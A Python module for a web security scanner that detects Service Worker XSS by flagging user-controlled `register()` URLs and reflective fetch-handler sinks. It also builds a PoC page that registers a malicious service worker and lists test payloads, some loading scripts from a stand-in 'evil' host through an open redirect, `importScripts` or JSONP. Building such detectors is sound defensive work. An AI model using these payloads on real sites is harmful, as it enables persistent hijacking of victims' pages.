"""Service Worker XSS detection.

Service Workers (SW) are programmable network proxies installed in the
browser via ``navigator.serviceWorker.register(url, {scope})``.  Once
installed, a SW intercepts every fetch under its scope, can read and
modify request/response bodies, and serve alternate responses.  Two
XSS vectors stem from Service Workers:

  1. **User-controlled registration URL** -- if the URL passed to
     ``register()`` is derived from a query parameter, hash fragment,
     or ``postMessage`` payload, an attacker can register a SW whose
     script is served from an attacker-controlled origin that runs
     under the victim's scope.  Browsers enforce same-origin on the SW
     script URL, BUT a same-site open redirect or a JSONP endpoint on
     the victim origin can be abused to host the SW script on the
     victim origin, bypassing the same-origin check.

  2. **Reflective SW script** -- the registered SW script itself reads
     request URLs (``event.request.url``) and reflects portions of them
     into a sink (``new Response(body)``, ``importScripts()``, ``eval``,
     ``new Function``).  Any page under the SW scope that hits a
     controlled URL triggers the SW code, yielding XSS in the page
     context.

Vulnerable SW script example::

    self.addEventListener('fetch', function(event) {
      var u = new URL(event.request.url);
      var name = u.searchParams.get('name');              // attacker-controlled
      event.respondWith(new Response('<h1>'+name+'</h1>', // sink!
        {headers: {'Content-Type': 'text/html'}}));
    });

Exploitation:

  * Register a malicious SW via a same-origin open redirect::

        navigator.serviceWorker.register('/redirect?to=//evil/sw.js');

  * Trigger a controlled fetch that the SW reflects into a Response
    body, executing ``<script>alert(1)</script>`` in the page.

This module:

  1. Detects ``navigator.serviceWorker.register(...)`` call sites and
     flags user-controlled registration URLs.
  2. Resolves the registered SW script URL and (when a ``fetcher``
     callable is supplied) fetches and analyzes the SW script for
     ``fetch`` handlers fed by ``event.request.url`` / ``searchParams``
     into dangerous sinks.
  3. Detects ``importScripts()`` of user-controlled URLs.
  4. Builds a PoC HTML page that registers an attacker SW.
"""
from __future__ import annotations
import re
from typing import Callable, Optional


# ``navigator.serviceWorker.register(url, {scope: ...})`` -- capture the URL
# expression.  Stops at the first comma / semicolon / close paren.
REGISTER_RE = re.compile(
    r'navigator\s*\.\s*serviceWorker\s*\.\s*register\s*\(\s*'
    r'([^,;)]+)',
    re.IGNORECASE,
)

# The options object ``{scope: ...}`` -- capture the scope value.
SCOPE_RE = re.compile(
    r'\{\s*scope\s*:\s*([^,}]+)',
    re.IGNORECASE,
)

# ``importScripts('...')`` inside the SW -- dynamically loaded scripts.
IMPORT_SCRIPTS_RE = re.compile(
    r'importScripts\s*\(\s*([^)]+)\)',
    re.IGNORECASE,
)

# ``self.addEventListener('fetch', ...)`` -- the canonical SW fetch handler.
FETCH_HANDLER_RE = re.compile(
    r'(?:self|this)\s*\.\s*addEventListener\s*\(\s*["\']fetch["\']',
    re.IGNORECASE,
)

# References to the attacker-controlled request URL inside a fetch handler.
REQUEST_URL_REF_RE = re.compile(
    r'event\s*\.\s*request\s*\.\s*url'
    r'|event\s*\.\s*request\s*\.\s*'
    r'|\.searchParams\s*\.\s*get\s*\('
    r'|new\s+URL\s*\(\s*event\s*\.\s*request',
    re.IGNORECASE,
)

# Sinks that turn a controlled value into executed or rendered content
# inside a SW.  Each entry: (regex, severity, description).
DANGER_SINKS: list[tuple[str, str, str]] = [
    (r'new\s+Response\s*\(', "high",
     "new Response(body) with attacker-controlled body -> XSS in page"),
    (r'\.respondWith\s*\(', "high",
     "event.respondWith() returns controlled Response"),
    (r'importScripts\s*\(', "high",
     "importScripts() of attacker-controlled URL"),
    (r'\beval\s*\(', "high",
     "eval() of attacker-controlled value in SW"),
    (r'new\s+Function\s*\(', "high",
     "new Function() of attacker-controlled value"),
    (r'setTimeout\s*\(\s*[^,)]*[a-zA-Z]', "medium",
     "setTimeout(string) in SW"),
    (r'setInterval\s*\(\s*[^,)]*[a-zA-Z]', "medium",
     "setInterval(string) in SW"),
    (r'caches\s*\.\s*put\s*\(\s*[^,)]*,\s*new\s+Response', "high",
     "caches.put with controlled Response poisons cache"),
]

SINK_RE = re.compile(
    "|".join("(?:%s)" % s[0] for s in DANGER_SINKS),
    re.IGNORECASE,
)

# Indicators that a snippet references user-controlled input: query
# string, hash, postMessage data, or location.
USER_INPUT_RE = re.compile(
    r'location\s*\.\s*(?:search|hash|href)'
    r'|searchParams\s*\.\s*get'
    r'|new\s+URLSearchParams'
    r'|event\s*\.\s*data'
    r'|message\s*\.\s*data',
    re.IGNORECASE,
)


def find_register_calls(html_or_js: str) -> list[dict]:
    """Locate ``navigator.serviceWorker.register(...)`` call sites.

    Returns a list of dicts::

        {
            "snippet":        str,          # ~300 char context
            "url_expr":       str,          # raw expression passed as URL
            "scope_expr":     str | None,   # value of the scope option, if any
            "user_controlled": bool,        # URL expression references user input
        }
    """
    if not html_or_js:
        return []
    out: list[dict] = []
    for m in REGISTER_RE.finditer(html_or_js):
        url_expr = m.group(1).strip().rstrip(',').strip()
        # Look ahead for an options object ``{scope: ...}``.
        tail = html_or_js[m.end():m.end() + 200]
        scope_m = SCOPE_RE.search(tail)
        scope_expr = scope_m.group(1).strip() if scope_m else None
        # Use a wide lookback (300 chars) so we capture the variable
        # assignment that feeds the register() call -- e.g.
        # ``var u = new URLSearchParams(location.search).get('sw');``
        # is typically 60-150 chars before the register() call.
        # The old 40-char lookback missed the taint source entirely.
        start = max(0, m.start() - 300)
        end = min(len(html_or_js), m.end() + 300)
        snippet = html_or_js[start:end]
        user_controlled = bool(USER_INPUT_RE.search(snippet))
        out.append({
            "snippet": snippet.strip()[:400],
            "url_expr": url_expr,
            "scope_expr": scope_expr,
            "user_controlled": user_controlled,
        })
    return out


def analyze_sw_script(sw_source: str) -> list[dict]:
    """Analyze a fetched service-worker script for reflective sinks.

    Returns a list of dicts::

        {
            "snippet":           str,        # ~600 char context
            "has_fetch_handler": bool,
            "has_request_ref":   bool,       # references event.request.url
            "sinks_found":       list[str],  # human-readable sink descriptions
            "exploitable":       bool,       # fetch handler + request ref + sink
        }
    """
    if not sw_source:
        return []
    findings: list[dict] = []
    for fm in FETCH_HANDLER_RE.finditer(sw_source):
        start = max(0, fm.start() - 40)
        end = min(len(sw_source), fm.end() + 800)
        snippet = sw_source[start:end]
        has_request_ref = bool(REQUEST_URL_REF_RE.search(snippet))
        sinks_found = [desc for pat, _, desc in DANGER_SINKS
                       if re.search(pat, snippet, re.IGNORECASE)]
        has_sink = bool(sinks_found)
        exploitable = has_request_ref and has_sink
        findings.append({
            "snippet": snippet.strip()[:600],
            "has_fetch_handler": True,
            "has_request_ref": has_request_ref,
            "sinks_found": sinks_found,
            "exploitable": exploitable,
        })
    # Bare ``importScripts()`` of user input runs at SW install time even
    # without a fetch handler -- flag it independently.
    for im in IMPORT_SCRIPTS_RE.finditer(sw_source):
        start = max(0, im.start() - 40)
        end = min(len(sw_source), im.end() + 200)
        snippet = sw_source[start:end]
        if USER_INPUT_RE.search(snippet):
            findings.append({
                "snippet": snippet.strip()[:400],
                "has_fetch_handler": False,
                "has_request_ref": True,
                "sinks_found": ["importScripts() of user-controlled URL"],
                "exploitable": True,
            })
    return findings


def _looks_like_url_literal(expr: str) -> bool:
    """Whether ``expr`` looks like a URL literal we can fetch statically."""
    if not expr:
        return False
    return (
        expr.startswith('/')
        or expr.startswith('./')
        or expr.startswith('../')
        or expr.startswith('//')
        or re.match(r'^https?://', expr, re.IGNORECASE) is not None
    )


def analyze_page(
    html: str,
    fetcher: Optional[Callable[[str], Optional[str]]] = None,
) -> dict:
    """Analyze a page for Service Worker XSS issues.

    Args:
        html: page HTML (or raw JS) to scan.
        fetcher: optional callable that takes a URL and returns the response
            body as a string (or ``None`` on error).  When supplied, the
            registered SW script URL is fetched and analyzed for sinks.

    Returns::

        {
            "has_register":     bool,        # any register() call found
            "vulnerable_count": int,
            "listeners":        list[dict],  # exploitable findings
            "exploitable":      bool,
        }
    """
    if not html:
        return {
            "has_register": False,
            "vulnerable_count": 0,
            "listeners": [],
            "exploitable": False,
        }
    registers = find_register_calls(html)
    listeners: list[dict] = []

    # User-controlled registration URL is the strongest signal.
    for reg in registers:
        if reg["user_controlled"]:
            listeners.append({
                "type": "register",
                **reg,
                "exploitable": True,
            })

    # If a fetcher is provided, fetch and analyze each registered SW URL
    # that looks like a static URL literal.
    if fetcher and registers:
        for reg in registers:
            url_expr = reg["url_expr"].strip().strip('"\'`')
            if not _looks_like_url_literal(url_expr):
                continue
            try:
                sw_src = fetcher(url_expr)
            except Exception:
                sw_src = None
            if not sw_src:
                continue
            for finding in analyze_sw_script(sw_src):
                if finding["exploitable"]:
                    listeners.append({
                        "type": "sw_script",
                        "sw_url": url_expr,
                        **finding,
                    })

    vulnerable_count = len(listeners)
    return {
        "has_register": bool(registers),
        "vulnerable_count": vulnerable_count,
        "listeners": listeners,
        "exploitable": vulnerable_count > 0,
    }


def build_poc_html(target_url: str, sw_url: str) -> str:
    """Build a PoC HTML page that registers a malicious service worker.

    The PoC calls ``navigator.serviceWorker.register(sw_url)`` against the
    victim origin.  In a real attack ``sw_url`` would point to an
    attacker-controlled script served via a same-origin open redirect or
    JSONP endpoint, since SW registration enforces same-origin on the
    script URL.
    """
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Service Worker XSS PoC</title></head>
<body>
<h2>Service Worker XSS PoC</h2>
<p>Victim: <code>{target_url}</code></p>
<p>Malicious SW script: <code>{sw_url}</code></p>
<pre>
// Once registered, the SW intercepts every fetch under its scope and
// can serve attacker-controlled responses, yielding persistent XSS.
</pre>
<script>
  (async function () {{
    try {{
      var reg = await navigator.serviceWorker.register("{sw_url}");
      console.log("SW registered:", reg);
      // Trigger a navigation so the SW's fetch handler runs.
      location.href = "{target_url}";
    }} catch (e) {{
      console.log("SW registration failed:", e);
    }}
  }})();
</script>
</body></html>
"""


def dangerous_payloads() -> list[str]:
    """High-yield payloads for Service Worker XSS testing."""
    return [
        # SW script body payloads (used when serving a malicious SW)
        "self.addEventListener('fetch',e=>e.respondWith(new Response('<script>alert(1)</script>',{{headers:{{'Content-Type':'text/html'}}}})));",
        "self.addEventListener('fetch',e=>importScripts('//evil/x.js'));",
        "self.addEventListener('fetch',e=>eval(e.request.url));",
        # Registration URL payloads (when register() takes user input)
        "/redirect?to=//evil/sw.js",
        "//victim.example/jsonp?cb=self.addEventListener('fetch',e=>e.respondWith(new%20Response('<script>alert(1)</script>')))//",
        "data:text/javascript,self.addEventListener('fetch',e=>e.respondWith(new Response('<img src=x onerror=alert(1)>',{headers:{'Content-Type':'text/html'}})));",
    ]
